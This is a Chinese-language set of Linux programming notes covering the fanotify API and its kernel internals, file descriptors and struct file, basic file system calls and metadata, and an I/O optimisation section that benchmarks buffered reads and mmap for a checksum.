<p><code>event_f_flag</code>将在为<code>fanotify</code>事件创建的打开文件描述上设置的文件状态标志。对于我们来说，设置<code>O_RDONLY | O_LARGEFILE</code>，只能读并且支持大文件就好了，其他的参见<a href="Advanced/Linux/LinuxProgram/(https://man7.org/linux/man-pages/man2/fanotify_init.2.html#DESCRIPTION)">链接</a>。</p>
<pre><code class="language-c">#include &lt;sys/fanotify.h&gt;

int fanotify_mark(int fanotify_fd, unsigned int flags,
                  uint64_t mask, int dirfd, const char *pathname);
</code></pre>
<p><code>fanotify_fd</code>就是之前<code>init</code>返回的文件描述符。</p>
<p><code>flags</code>表示之后的mask是要添加<code>FAN_MARK_ADD</code>还是要删除<code>FAN_MARK_REMOVE</code>，还有清空<code>FAN_MARK_FLUSH</code>。是这三者之一，然后在或上<a href="https://man7.org/linux/man-pages/man2/fanotify_mark.2.html#DESCRIPTION">其他的宏</a>。</p>
<p><code>mask</code><strong>决定了哪些event将要被监听/忽略</strong>。</p>
<div class="table-wrapper"><table><thead><tr><th>Macro</th><th>Meaning</th></tr></thead><tbody>
<tr><td>FAN_ACCESS</td><td>监听对file/dir的access(read)</td></tr>
<tr><td>FAN_MODIFY</td><td>监听对file的modify(write)</td></tr>
<tr><td>FAN_CLOSE_WRITE</td><td>监听一个writable file的关闭</td></tr>
<tr><td>FAN_CLOSE_NOWRITE</td><td>监听一个read-only file的关闭</td></tr>
<tr><td>FAN_OPEN</td><td>监听一个file/dir的open</td></tr>
<tr><td>FAN_OPEN_EXEC</td><td>(since 5.0) 监听一个fiile/dir因为将要被执行的打开</td></tr>
<tr><td>FAN_ATTRIB</td><td>(since 5.1)监听file/dir的metadata的改变</td></tr>
<tr><td>FAN_CREATE</td><td>(since 5.1)监听dir下file/dir的创建</td></tr>
<tr><td>FAN_DELETE</td><td>(since 5.1)监听dir下file/dir的删除</td></tr>
<tr><td>FAN_DELETE_SELF</td><td>(since 5.1)监听dir/file自身的删除</td></tr>
<tr><td>FAN_MOVED_FROM</td><td>(since 5.1)监听dir下file/dir的被移动走</td></tr>
<tr><td>FAN_MOVED_TO</td><td>(since 5.1)监听dir下file/dir的被移动来</td></tr>
<tr><td>FAN_MOVE_SELF</td><td>(since 5.1)监听file/dir的移动</td></tr>
<tr><td>FAN_OPEN_PERM</td><td>监听对file/dir打开权限的请求？</td></tr>
<tr><td>FAN_OPEN_EXEC_PERM</td><td>监听对file/dir为了执行而打开的权限的请求？</td></tr>
<tr><td>FAN_ACCESS_PERM</td><td>监听对file/dir读权限的请求？</td></tr>
<tr><td>FAN_ONDIR</td><td></td></tr>
<tr><td>FAN_EVENT_ON_CHILD</td><td></td></tr>
</tbody></table>
</div>
<ol>
<li>对于dir下的监听，An fanotify group that identifies filesystem objects by file handles is required.</li>
<li>对于PERM类型的Mask，需要和有<code>FAN_CLASS_PRE_CONTENT</code> 或<code>FAN_CLASS_CONTENT</code>的fd一起使用。</li>
</ol>
<p><code>dirfd</code>和<code>pathname</code>一起指明了被监控的文件</p>
<ul>
<li>pathname == NULL, dirfd 指定了filesystem object</li>
<li>pathname == NULL, dirfd == AT_FDCWD , 表示当前目录</li>
<li>pathname 是绝对路径，dirfd被忽略，</li>
<li>pathname 是相对路径，相对于dirfd 的相对路径</li>
<li>pathname 是相对路径，dirfd == AT_FDCWD， 相对于当前目录的相对路径</li>
</ul>
<p>如果成功返回0，失败返回-1。也是用errno返回错误码。</p>
<pre><code class="language-c">struct fanotify_event_metadata {
    __u32 event_len;
    __u8 vers;
    __u8 reserved;
    __u16 metadata_len;
    __aligned_u64 mask;
    __s32 fd;
    __s32 pid;
};
struct fanotify_event_info_header {
    __u8 info_type;
    __u8 pad;
    __u16 len;
};
struct fanotify_event_info_fid {
    struct fanotify_event_info_header hdr;
    __kernel_fsid_t fsid;
    unsigned char file_handle[0];
};
</code></pre>
<p>如果read成功，那么我们的read buffer中会有若干个上面的结构体。</p>
<ul>
<li><code>event_len</code>: 当前event data的长度，也是下个event的偏移</li>
<li><code>vers</code>: version</li>
<li><code>reserved</code>: reserved</li>
<li><code>metadata_len</code>: 当前event metadata的长度，有了这个字段方便metadata的扩展，不过现在还没有。</li>
<li><code>mask</code>: 表示发生了哪些event，和上面的mask一样。</li>
<li><code>fd</code>: 指向了文件</li>
<li><code>pid</code>: 导致了event的进程pid。 If flag FAN_REPORT_TID was set in fanotify_init(2), this is the <code>TID</code> of the thread that caused the event.</li>
</ul>
<p>​	</p>
<p><a href="https://lexuswang.github.io/2020/08/27/Fanotify/">Demo</a></p>
<h2 id="内核部分"><a class="header" href="#内核部分">内核部分</a></h2>
<p><code>fanotify_handle_event</code> -&gt; <code>fanotify_get_response</code></p>
<pre><code class="language-c">// fanotify_handle_event: 如果是PERM事件需要等待回复
if (fanotify_is_perm_event(mask)) {
    ret = fanotify_get_response(group, FANOTIFY_PE(fsn_event),
                                iter_info);
}
// fanotify_get_response: 等 event-&gt;state 被写
ret = wait_event_killable(group-&gt;fanotify_data.access_waitq,
                          event-&gt;state == FAN_EVENT_ANSWERED);
</code></pre>
<pre><code class="language-c">/*
 * Structure for permission fanotify events. It gets allocated and freed in
 * fanotify_handle_event() since we wait there for user response. When the
 * information is retrieved by userspace the structure is moved from
 * group-&gt;notification_list to group-&gt;fanotify_data.access_list to wait for
 * user response.
 */
struct fanotify_perm_event {
	struct fanotify_event fae;
	unsigned short response;	/* userspace answer to the event */
	unsigned short state;		/* state of the event */
	int fd;		/* fd we passed to userspace for this event */
};

/*
 * Structure for normal fanotify events. It gets allocated in
 * fanotify_handle_event() and freed when the information is retrieved by
 * userspace
 */
struct fanotify_event {
	struct fsnotify_event fse;
	u32 mask;
	/*
	 * Those fields are outside fanotify_fid to pack fanotify_event nicely
	 * on 64bit arch and to use fh_type as an indication of whether path
	 * or fid are used in the union:
	 * FILEID_ROOT (0) for path, &gt; 0 for fid, FILEID_INVALID for neither.
	 */
	u8 fh_type;
	u8 fh_len;
	u16 pad;
	union {
		/*
		 * We hold ref to this path so it may be dereferenced at any
		 * point during this object's lifetime
		 */
		struct path path;
		/*
		 * With FAN_REPORT_FID, we do not hold any reference on the
		 * victim object. Instead we store its NFS file handle and its
		 * filesystem's fsid as a unique identifier.
		 */
		struct fanotify_fid fid;
	};
	struct pid *pid;
};
</code></pre>
<pre><code>fsnotify_perm 
fsnotify -&gt; fanotify
            dnotify
            ionotify
</code></pre>
<p>当我们发现perm需要用户验证的时候的调用栈是这样的</p>
<pre><code>[#0] 0xffffffff8131dcce → fanotify_get_response(iter_info=&lt;optimized out&gt;, event=&lt;optimized out&gt;, group=&lt;optimized out&gt;)
[#1] 0xffffffff8131dcce → fanotify_handle_event(group=0xffff888005eeef00, inode=&lt;optimized out&gt;, mask=&lt;optimized out&gt;, data=0xffff8880052b2710, data_type=&lt;optimized out&gt;, file_name=&lt;optimized out&gt;, cookie=0x0, iter_info=0xffffc9000020fb40)
// 如果发现不需要请求权限，就到此为止了
[#2] 0xffffffff81319aad → send_to_group(iter_info=&lt;optimized out&gt;, file_name=&lt;optimized out&gt;, cookie=&lt;optimized out&gt;, data_is=&lt;optimized out&gt;, data=&lt;optimized out&gt;, mask=&lt;optimized out&gt;, to_tell=&lt;optimized out&gt;)
[#3] 0xffffffff81319aad → fsnotify(to_tell=&lt;optimized out&gt;, mask=&lt;optimized out&gt;, data=&lt;optimized out&gt;, data_is=&lt;optimized out&gt;, file_name=&lt;optimized out&gt;, cookie=&lt;optimized out&gt;)
[#4] 0xffffffff8143ed14 → fsnotify_path(mask=&lt;optimized out&gt;, path=&lt;optimized out&gt;, inode=&lt;optimized out&gt;)
[#5] 0xffffffff8143ed14 → fsnotify_path(mask=&lt;optimized out&gt;, path=&lt;optimized out&gt;, inode=&lt;optimized out&gt;)
[#6] 0xffffffff8143ed14 → fsnotify_perm(mask=&lt;optimized out&gt;, file=&lt;optimized out&gt;)
[#7] 0xffffffff8143ed14 → security_file_open(file=&lt;optimized out&gt;)
[#8] 0xffffffff812c5b7f → do_dentry_open(f=0xffff8880052b2700, inode=0xffff888004d68dc0, open=0x0 &lt;fixed_percpu_data&gt;)
[#9] 0xffffffff812c72cd → vfs_open(path=&lt;optimized out&gt;, file=&lt;optimized out&gt;)
</code></pre>
<div style="break-before: page; page-break-before: always;"></div><h1 id="file-program"><a class="header" href="#file-program">File Program</a></h1>
<p>我们常常听说Unix/Linux的哲学是“一切皆文件”。这个基本概念有两种含义：</p>
<ul>
<li>在 UNIX 中，一切都是字节流</li>
<li>在 UNIX 中，文件系统被用作通用的命名空间</li>
</ul>
<p>所以，他对我们在Unix/Linux环境下编程提供了怎样的模式呢？</p>
<h2 id="file-in-kernel"><a class="header" href="#file-in-kernel">File In Kernel</a></h2>
<blockquote>
<p>In the Linux kernel, there are basically seven kinds of files: regular, directory, link, character device, block device, fifo and socket. Each of them can be represented by a <strong>file descriptor</strong>. A file descriptor is basically an integer that is only meaningful for a given process. For each file descriptor, there is an associated structure: <strong>struct file</strong>.</p>
</blockquote>
<p>从内核的角度看，所谓文件是一个用<code>struct file</code>抽象管理的资源。他可能对应硬盘上的一个真实文件，也可能/proc中的一个内存文件，还可以是一个socket。</p>
<pre><code class="language-c">// [include/linux/fs.h] 只列出了关键字段

struct file {
    loff_t                            f_pos;            // &quot;cursor&quot; while reading file
    atomic_long_t                     f_count;          // object's reference counter
    const struct file_operations      *f_op;            // virtual function table (VFT) pointer
    void                              *private_data;      // used by file &quot;specialization&quot;
    // ...
};
</code></pre>
<p>每个进程都有自己的打开文件表，task_struct -&gt; files_struct -&gt; fdtable -&gt; fd指向打开文件表。打开文件表中可能有若干个<code>struct file*</code>指向同一个<code>struct file</code>，所以struct file中有f_count做引用计数。</p>
<pre><code class="language-c">// [include/linux/fdtable.h]

struct files_struct {
    atomic_t count;           // reference counter
    struct fdtable *fdt;      // pointer to the file descriptor table
    // ...
};
struct fdtable {
    unsigned int max_fds;
    struct file ** fd;      /* current fd array */
    // ...
};
</code></pre>
<p>如果熟悉面向对象语言，<code>struct file</code>就是file类。结构体内的内容就是他的数据，所以方法呢？方法就是f_op指向的file_operations的一大堆函数指针。</p>
<pre><code class="language-c">// [include/linux/fs.h]

struct file_operations {
    ssize_t (*read) (struct file *, char __user *, size_t, loff_t *);
    ssize_t (*write) (struct file *, const char __user *, size_t, loff_t *);
    int (*open) (struct inode *, struct file *);
    int (*release) (struct inode *, struct file *);
    // ...
};
</code></pre>
<p>我们可以用open/socket等系统调用打开文件。返回值是一个整数，叫做文件描述符，其实就是打开文件表fd的一个索引。你可以对文件描述符做read/write等系统调用，其实就是调用对应的file_operations。比如</p>
<pre><code class="language-c">// [net/socket.c]

static const struct file_operations socket_file_ops = {
    .read = sock_aio_read,      // &lt;---- calls sock-&gt;ops-&gt;recvmsg()
    .write =    sock_aio_write, // &lt;---- calls sock-&gt;ops-&gt;sendmsg()
    .llseek =   no_llseek,      // &lt;---- returns an error
    // ...
}
</code></pre>
<p>看到这里，你是否对我们发起系统调用时，内核大概做了什么有了一定的了解？</p>
<pre><code class="language-c">#include &lt;stdio.h&gt;
#include &lt;sys/socket.h&gt;
#include &lt;unistd.h&gt;

int main(int argc, char*argv[]) {
        char* buf = &quot;hello&quot;;
    // 内核创建了一个struct file  //其实还有struct socket，里面有struct file*
    // 当前进程的task_struct -&gt; files_struct -&gt; fdtable -&gt; fd会添加一个 struct file *
    // 返回fd中的索引
        int fd = socket(AF_UNIX, SOCK_STREAM, 0);  
    // 调用对应的struct file* -&gt; file_operations-&gt;write
        write(fd ,buf, 5);
    	close(fd);
        return 0;
}
</code></pre>
<h2 id="how-user-use-file-1"><a class="header" href="#how-user-use-file-1">How User Use File 1</a></h2>
<p>作为用户，我们是如何使用文件的？其实非常简单。打开文件-读写文件-关闭文件。这对应着执行文件 I/O 操作的 4 个主要系统调用。</p>
<ul>
<li><a href="https://man7.org/linux/man-pages/man2/open.2.html"><code>int open(const char *pathname, int flags, mode_t mode);</code></a> 函数打开 <code>pathname</code> 所标识的文件，并返回<strong>文件描述符<code>fd</code></strong>，用以在后续函数调用中指代打开的文件。如果文件不存在，<code>open()</code>函数可以创建之，这取决于对位掩码参数 <code>flags</code> 的设置。<code>flags</code> 参数还可指定文件的打开方式：只读、只写亦或是读写方式。<code>mode</code> 参数则指定了由 <code>open()</code>调用创建文件的访问权限，如果 <code>open()</code>函数并未创建文件，那么可以忽略或省略 <code>mode</code> 参数。</li>
<li><a href="https://man7.org/linux/man-pages/man2/read.2.html"><code>ssize_t read(int fd, void *buf, size_t count);</code></a> 调用从 fd 所指代的打开文件中读取至多 count 字节的数据，并存储到 buffer 中。read()调用的返回值为实际读取到的字节数。如果再无字节可读（例如：读到文件结尾符 EOF 时），则返回值为 0。</li>
<li><a href="https://man7.org/linux/man-pages/man2/write.2.html"><code>ssize_t write(int fd, const void *buf, size_t count);</code></a> 调用从 buffer 中读取多达 count 字节的数据写入由fd 所指代的已打开文件中。write()调用的返回值为实际写入文件中的字节数，且有可能小于 count。</li>
<li><a href="https://man7.org/linux/man-pages/man2/close.2.html"><code>int close(int fd);</code></a> 在所有输入/输出操作完成后，调用 close()，释放文件描述符 fd 以及与之相关的内核资源。</li>
</ul>
<p>通常，编程语言的标准库会对这些操作进行封装，而不是让我们直接用系统调用进行编程。比如C语言中就会有<code>fopen</code>,<code>fread</code>等。另外，以上介绍的是最基本的操作，open的flag不同可以有多种多样的结果，读和写也不只局限于这两个基本的系统调用。下面详细介绍open。</p>
<h3 id="open"><a class="header" href="#open">open</a></h3>
<p>如果你对C语言的文件<code>fopen</code>有基本的了解，或者其他语言的基本I/O也类似，你很容易想到，flag可能会声明我们将会以读还是写的方式打开文件，也的确如此。</p>
<p>所以基本的flag有下面几个，不过其实还有很多其他的flag，可以点击上面<code>open</code>的链接查看。</p>
<div class="table-wrapper"><table><thead><tr><th>flag</th><th>含义</th></tr></thead><tbody>
<tr><td>O_RDONLY</td><td>以只读方式打开</td></tr>
<tr><td>O_WRONLY</td><td>以只写方式打开</td></tr>
<tr><td>O_RDWR</td><td>以读写方式打开</td></tr>
</tbody></table>
</div>
<p>这时C语言中fopen的mode和open中flag的对照。可以发现封装之后，fopen对打开的控制只是原来的一个子集。</p>
<div class="table-wrapper"><table><thead><tr><th>fopen的mode参数</th><th>含义</th><th>open的flag参数</th></tr></thead><tbody>
<tr><td>r</td><td>以只读方式打开文件</td><td>O_RDONLY</td></tr>
<tr><td>r+</td><td>以读写方式打开文件</td><td>O_RDWR</td></tr>
<tr><td>w</td><td>以只写方式打开文件，如果原来文件存在会将他清空，原来文件不存在会创建</td><td>O_WRONLY | O_CREAT | O_TRUNC</td></tr>
<tr><td>w+</td><td>以读写方式打开文件，如果原来文件存在会将他清空，原来文件不存在会创建</td><td>O_RDWR | O_CREAT |  O_TRUNC</td></tr>
<tr><td>a</td><td>以只写方式打开文件，原来文件不存在会创建，流指向文件末尾</td><td>O_WRONLY | O_CREAT | O_APPEND</td></tr>
<tr><td>a+</td><td>以读写方式打开文件，原来文件不存在会创建，流指向文件末尾</td><td>O_RDWR | O_CREAT | O_APPEND</td></tr>
</tbody></table>
</div>
<p>若打开文件时发生错误，open()将返回−1，错误号 errno 标识错误原因。</p>
<h3 id="读写"><a class="header" href="#读写">读写</a></h3>
<ul>
<li><code>read</code>和<code>write</code>是最基本的读写。他背后做了什么呢？read()和 write()系统调用在操作磁盘文件时不会直接发起磁盘访问，而是仅仅在**用户空间缓冲区(buf参数)与内核缓冲区高速缓存(kernel buffer cache)**之间复制数据。然后等系统调度IO在某个合适的时机完成真正的写入。在大多数时候，这不是我们关心的。能读能写就好。</li>
<li><code>pread</code>和<code>pwrite</code> 完成与 read()和 write()相类似的工作，只是前两者会在 offset 参数
所指定的位置进行文件 I/O 操作，而非始于文件的当前偏移量处，且它们不会改变文件的当前偏移量。他的用武之地是多线程。进程下辖的所有线程将共享同一文件描述符表。这也意味着每个已打开文件的文件偏移量为所有线程所共享。如果我们需要使用lseek+read/write的模式，就需要加锁，用pread/pwrite更好。</li>
<li><code>readv</code>和<code>writev</code>。readv()和 writev()系统调用分别实现了分散输入和集中输出的功能。</li>
</ul>
<p>无缓冲写：调用 open()函数时如指定 O_SYNC 标志，每个 write()调用会自动将文件数据和元数据刷新到磁盘上。或者通过调用<code>fsync</code>,<code>fdatasync</code>,<code>sync</code>。</p>
<p><code>posix_fadvise()</code>系统调用允许进程就自身访问文件数据时可能采取的模式通知内核。</p>
<p>在通用 I/O 模型之外，<code>ioctl()</code>系统调用又为执行文件和设备操作提供了一种多用途机制。</p>
<h3 id="多个进程同时读写"><a class="header" href="#多个进程同时读写">多个进程同时读写</a></h3>
<p>多个进程同时读：没关系</p>
<p>Read+Write：需要加锁，否则读入和写入的东西可能是莫名其妙的内容。<code>fdctl</code>系统调用让我们可以加锁。</p>
<p>多个程序同时写：当然也是需要加锁的。不过一种特殊情况是，如果使用<code>O_APPEND</code> 标志来打开文件，这样在每次写入时都会 <code>lseek</code> 到文件末尾进行写入，这是一个原子操作，因此不会产生同步问题。比如写日志操作就是一个典型的情况。</p>
<h2 id="file-attribute"><a class="header" href="#file-attribute">File Attribute</a></h2>
<p>我们来探讨文件的各种属性，也就是文件的元数据。</p>
<p>利用<a href="https://man7.org/linux/man-pages/man2/lstat.2.html">stat系列函数</a>，可以获得文件的元数据。</p>
<pre><code class="language-c">#include &lt;sys/stat.h&gt;

int stat(const char *restrict pathname,
         struct stat *restrict statbuf);
int fstat(int fd, struct stat *statbuf);
int lstat(const char *restrict pathname,
          struct stat *restrict statbuf);

#include &lt;fcntl.h&gt;           /* Definition of AT_* constants */
#include &lt;sys/stat.h&gt;

int fstatat(int dirfd, const char *restrict pathname,
            struct stat *restrict statbuf, int flags);
</code></pre>
<ul>
<li><code>stat</code>会返回路径名对应文件的信息。</li>
<li><code>lstat</code>和<code>stat</code>类似，但是如果文件是符号链接，那么返回的信息针对的是符号文件本身。</li>
<li><code>fstat</code>会返回打开文件描述符所指向文件的相关信息。</li>
<li><code>fstatat</code>会在<code>dirfd</code>指定的目录下返回对应文件的信息，也就是说<code>pathname</code>是相对<code>dirfd</code>的路径。事实上，<code>flags = AT_EMPTY_PATH</code>的时候fstatat类似<code>fstat</code>，<code>flag = AT_SYMLINK_NOFOLLOW</code>的时候flags类似<code>lstat</code>。所以，用<code>fstatat</code>好多了，一个顶三个。</li>
</ul>
<p>返回的信息用struct stat来表示。通过<code>st_dev</code>标识的设备号和<code>st_ino</code>表示的inode号，我们可以在所有文件系统中唯一标识一个文件。<code>st_mode</code>存储了文件的<strong>类型和权限</strong>，<code>st_size</code>说明了文件的大小。其他的不具体介绍了可以看注释。</p>
<pre><code class="language-c">struct stat {
    dev_t     st_dev;         /* ID of device containing file */
    ino_t     st_ino;         /* Inode number */
    mode_t    st_mode;        /* File type and mode */
    nlink_t   st_nlink;       /* Number of hard links */
    uid_t     st_uid;         /* User ID of owner */
    gid_t     st_gid;         /* Group ID of owner */
    dev_t     st_rdev;        /* Device ID (if special file) */
    off_t     st_size;        /* Total size, in bytes */
    blksize_t st_blksize;     /* Block size for filesystem I/O */
    blkcnt_t  st_blocks;      /* Number of 512B blocks allocated */

    /* Since Linux 2.6, the kernel supports nanosecond
                  precision for the following timestamp fields.
                  For the details before Linux 2.6, see NOTES. */

    struct timespec st_atim;  /* Time of last access */
    struct timespec st_mtim;  /* Time of last modification */
    struct timespec st_ctim;  /* Time of last status change */

    #define st_atime st_atim.tv_sec      /* Backward compatibility */
    #define st_mtime st_mtim.tv_sec
    #define st_ctime st_ctim.tv_sec
};
</code></pre>
<h3 id="时间戳"><a class="header" href="#时间戳">时间戳</a></h3>
<p>st_atim st_mtim st_ctim 分别对应了访问时间、修改时间和文件状态改变时间。</p>
<p>关于时间戳，很多对文件的操作都会改变文件的时间戳。除此之外，有专门用来修改时间戳的系统调用，可以直接改变时间戳到任意时间。现在更流行的是<code>utimensat</code>和<code>futimens</code>，因为他们可以独立设置一个时间戳。</p>
<pre><code class="language-c">#include &lt;utime.h&gt;
int utime(const char *filename, const struct utimbuf *times);

#include &lt;sys/time.h&gt;
int utimes(const char *filename, const struct timeval times[2]);

#include &lt;fcntl.h&gt;            /* Definition of AT_* constants */
#include &lt;sys/stat.h&gt;

int utimensat(int dirfd, const char *pathname,
              const struct timespec times[2], int flags);
int futimens(int fd, const struct timespec times[2]);
</code></pre>
<p>在打开文件的时候，<code>open</code>的O_NOATIME标识可以不更新时间戳，可以降低对磁盘的操作次数，提升程序性能。</p>
<h3 id="所有者"><a class="header" href="#所有者">所有者</a></h3>
<p>st_uid st_gid分别对应了文件的 属主 和 属组。</p>
<p>当我们创建文件的时候，文件的UID取自进程的<strong>文件系统用户 ID <strong>，GID取自进程的</strong>文件系统组ID</strong>。</p>
<p>通过chown系列系统调用我们可以修改文件的属主和属组。</p>
<pre><code class="language-c">#include &lt;unistd.h&gt;

int chown(const char *pathname, uid_t owner, gid_t group);
int fchown(int fd, uid_t owner, gid_t group);
int lchown(const char *pathname, uid_t owner, gid_t group);

#include &lt;fcntl.h&gt;           /* Definition of AT_* constants */
#include &lt;unistd.h&gt;

int fchownat(int dirfd, const char *pathname,
             uid_t owner, gid_t group, int flags);
</code></pre>
<p>看函数参数大概能猜到他们是做什么用的。他们之间的区别和stat系列函数一样。可以将owner和group设置为-1表示不变。</p>
<h3 id="文件权限"><a class="header" href="#文件权限">文件权限</a></h3>
<p><code>st_mode</code>的低12位表示了文件的权限。其中的前 3 位为专用位，分别是 set-user-ID 位、set-group-ID 位和 sticky 位，后9位是我们熟悉的用户-组-其他的RWXRWXRWX位。</p>
<p>对于目录来说，RWX的含义是：</p>
<ul>
<li>读权限：可列出目录之下的内容（即目录下的文件名）。</li>
<li>写权限：可在目录内创建、删除文件。注意，要删除文件，对文件本身无需有任何权限。</li>
<li>可执行权限：可访问目录中的文件。因此，有时也将对目录的执行权限称为 search（搜索）权限。</li>
</ul>
<p>chmod系列系统调用可以改变文件的权限。</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="io-bound-程序优化"><a class="header" href="#io-bound-程序优化">I/O bound 程序优化</a></h1>
<blockquote>
<h2 id="we-should-forget-about-small-efficiencies-say-about-97-of-the-time-premature-optimization-is-the-root-of-all-evil-yet-we-should-not-pass-up-our-opportunities-in-that-critical-3"><a class="header" href="#we-should-forget-about-small-efficiencies-say-about-97-of-the-time-premature-optimization-is-the-root-of-all-evil-yet-we-should-not-pass-up-our-opportunities-in-that-critical-3">We should forget about small efficiencies, say about 97% of the time: premature optimization is the root of all evil. Yet we should not pass up our opportunities in that critical 3%</a></h2>
<h2 id="any-problem-in-computer-science-can-be-solved-by-another-layer-of-indirection"><a class="header" href="#any-problem-in-computer-science-can-be-solved-by-another-layer-of-indirection">Any problem in computer science can be solved by another layer of indirection.</a></h2>
</blockquote>
<h2 id="加速io"><a class="header" href="#加速io">加速IO</a></h2>
<p>学到现在，我发现提高IO速度的方法不外乎两种，Cache和Buffer。他们的中文都是缓存，但是有细微的区别</p>
<ul>
<li>Cache：低速设备到高速设备的缓存，利用数据局部性，通过使用存储系统分级的策略来减小这种差异带来的影响。例如CPU是高速的，Memory是低速的，中间就有多级的Cache提高效率。</li>
<li>Buffer： buffer 的主要目的进行流量整形，把突发的大数量较小规模的 I/O 整理成平稳的小数量较大规模的 I/O，以<strong>减少响应次数</strong>。</li>
</ul>
<p>举一个例子，不过在系统内核中read系统调用有没有做一定的缓存呢？我不清楚。即使有，系统调用的速度也是稍慢的，因为涉及特权级的转换，我们做的buffer肯定也还是有用的。程序是计算一个4G文件的checksum，当然下面计算的时候在不是8字节对齐没有补零是不对的。下面的程序为了更贴近底层也是直接用系统调用做了。</p>
<center>
    无buffer版
</center>
<pre><code class="language-c">#include &lt;fcntl.h&gt;
#include &lt;stdio.h&gt;
#include &lt;sys/stat.h&gt;
#include &lt;unistd.h&gt;

int main() {
    char buffer[8];
    long checksum = 0;

    int fd = open(&quot;disk.dd&quot;, O_RDONLY);
    while (1) {
        int b = read(fd, buffer, 8);
        if (b != 8)
            break;
        checksum ^= *(long *)buffer;
    }
    printf(&quot;checksum = 0x%lx\n&quot;, checksum);
    close(fd);
}
// checksum = 0xdcce4fdc7fd2151d
// real    6m13.657s
// user    0m40.016s
// sys     5m33.439s
</code></pre>
<center> 
    有buffer版
</center>
<pre><code class="language-c">#include &lt;fcntl.h&gt;
#include &lt;stdio.h&gt;
#include &lt;sys/stat.h&gt;
#include &lt;unistd.h&gt;

int main() {
    char buffer[4096];
    long checksum = 0;

    int fd = open(&quot;disk.dd&quot;, O_RDONLY);
    while (1) {
        int b = read(fd, buffer, 4096);
        for (int i = 0; i &lt; (b &gt;&gt; 3); i++) {
            checksum ^= *((long *)buffer + i);
        }
        if (b &lt;= 8)
            break;
    }
    printf(&quot;checksum = 0x%lx\n&quot;, checksum);
    close(fd);
}
// checksum = 0xdcce4fdc7fd2151d
// real    0m5.857s
// user    0m3.187s
// sys     0m2.550s
</code></pre>
<p>可以看到两个的速度差的不是一点半点。我也用了<code>fread</code>试了一下，发现即使一次读8字节<code>fread</code>的效率也不会太差。<code>fread</code>是自带缓存的。我又去查了一下，在stackoverflow上看到了，也是验证了我的猜想。</p>
<blockquote>
<p><code>read()</code> is a low level, unbuffered read. It makes a direct system call on UNIX. 其实也并不是完全没有缓存，内核还是有做的。</p>
<p><code>fread()</code> is part of the C library, and provides buffered reads. It is usually implemented by calling <code>read()</code> in order to fill its buffer.</p>
</blockquote>
<p>顺便来一个Rust版本的，和C语言的语义几乎一模一样。Rust中可以用<code>BufReader</code>去套一个实现了<code>Read</code> trait的结构，就可以自动的实现buffer的功能了，非常方便。</p>
<p>不过有意思的是如果用debug模式执行会非常的慢，而且是慢在了user部分，我猜测可能是这个transmute_copy老老实实的在内存中完成了，没有做相应的优化，Rust的汇编太复杂了，以后有空在深究这个问题。</p>
<center> Rust使用BufReader </center>
<pre><pre class="playground"><code class="language-rust">use std::{
    fs::File,
    io::{BufReader, Read},
};

fn main() {
    let mut buffer = [0u8; 8];
    let buffer = &amp;mut buffer;

    let f = File::open(&quot;disk.dd&quot;).unwrap();
    let mut f = BufReader::with_capacity(4096, f);

    let mut checksum: u64 = 0;
    loop {
        let b = f.read(buffer).unwrap();
        if b == 8 {
            unsafe {
                checksum = std::mem::transmute_copy::&lt;[u8; 8], u64&gt;(buffer) ^ checksum;
            }
        } else {
            break;
        }
    }
    println!(&quot;checksum = 0x{:x}&quot;, checksum);
}
// debug模式下，注意这里耗时的是user部分
// checksum = 0xdcce4fdc7fd2151d
// real    4m13.759s
// user    4m11.227s
// sys     0m2.464s

// release模式下
// checksum = 0xdcce4fdc7fd2151d
// real    0m9.864s
// user    0m7.135s
// sys     0m2.678s
</code></pre></pre>
<h2 id="减少不必要的内存拷贝"><a class="header" href="#减少不必要的内存拷贝">减少不必要的内存拷贝</a></h2>
<p>什么是减少不必要的内存拷贝？比如，</p>
<ul>
<li>在Java中适当的用StringBuilder代替String（堆的复制）；</li>
<li>在C语言中，不要传递大结构体作为函数参数（栈的复制）。</li>
<li>减少内核和用户之间的拷贝。</li>
</ul>
<p>当然，有时候这个并不会成为性能的瓶颈：相比IO，内存复制一定是快的。</p>
<h3 id="减少内核和用户之间的拷贝"><a class="header" href="#减少内核和用户之间的拷贝">减少内核和用户之间的拷贝</a></h3>
<p>出于安全的考虑，内核不应该直接使用用户指针指向的内存，用户更不可能直接使用内核指针指向的内存。他们之间的信息交换，基本都要涉及拷贝，比如Linux上的<code>copy_to_user</code>和<code>copy_from_user</code>。</p>
<p><a href="https://man7.org/linux/man-pages/man2/mmap.2.html"><code>mmap</code></a>也是一个非常好用的东西。什么是mmap？mmap是一种内存映射文件的方法，即将一个文件或者其它对象映射到进程的地址空间，实现文件磁盘地址和进程虚拟地址空间中一段虚拟地址的一一对映关系。实现这样的映射关系后，进程就可以使用操作内存的方式操作文件，而系统会自动回写脏页面到对应的文件磁盘上，即完成了对文件的操作而不必再调用read,write等系统调用函数。相反，内核空间对这段区域的修改也直接反映用户空间，从而可以实现不同进程间的文件共享。</p>
<p>所以，当你有若干个进程以只读的方式访问一个文件，或者是访问较大文件的大块，用mmap都是很好的选择。mmap还可以用来做进程通信。不过并不是所有的文件都可以用<code>mmap</code>来访问，例如socket就只能用他专有的接口读写，还有pipe类型的文件就只能用<code>read</code>/<code>write</code>等。也不是所有能用<code>mmap</code>的文件都适合用<code>mmap</code>，一个和page差不多大的文件，或者你就想从文件中读那么几个字节，用<code>mmap</code>适得其反。</p>
<center> 使用mmap </center>
<pre><code class="language-c">#include &lt;fcntl.h&gt;
#include &lt;stdio.h&gt;
#include &lt;sys/mman.h&gt;
#include &lt;sys/stat.h&gt;
#include &lt;unistd.h&gt;

int main() {
    long checksum = 0;
    struct stat sb;

    int fd = open(&quot;disk.dd&quot;, O_RDONLY);
    fstat(fd, &amp;sb);
    void *file = mmap(0, sb.st_size, PROT_READ, MAP_PRIVATE, fd, 0);

    for (long i = 0; i &lt; (sb.st_size &gt;&gt; 3); i++) {
        checksum ^= *((long *)file + i);
    }
    printf(&quot;checksum = 0x%lx\n&quot;, checksum);
    close(fd);
}

// checksum = 0xdcce4fdc7fd2151d
// real    0m5.762s
// user    0m2.910s
// sys     0m2.358s
</code></pre>
<p>mmap为什么会比带buffer的read/write快呢，Page Size是4K，每次缺页加载4K，和我之前手动Buffer不是很相似吗？因为<strong>少了一次CPU的拷贝</strong>。试想read的过程，DMA将数据从硬盘拷贝到kernel space，CPU再将数据从kernel space拷贝到user space；而mmap就少了一次从kernel space拷贝到user space的过程。</p>
<p>不过在使用mmap的时候需要小心，如果有其他的进程截断了文件，那么你可能会访问到一个非法的地址，从而进程被杀死。</p>
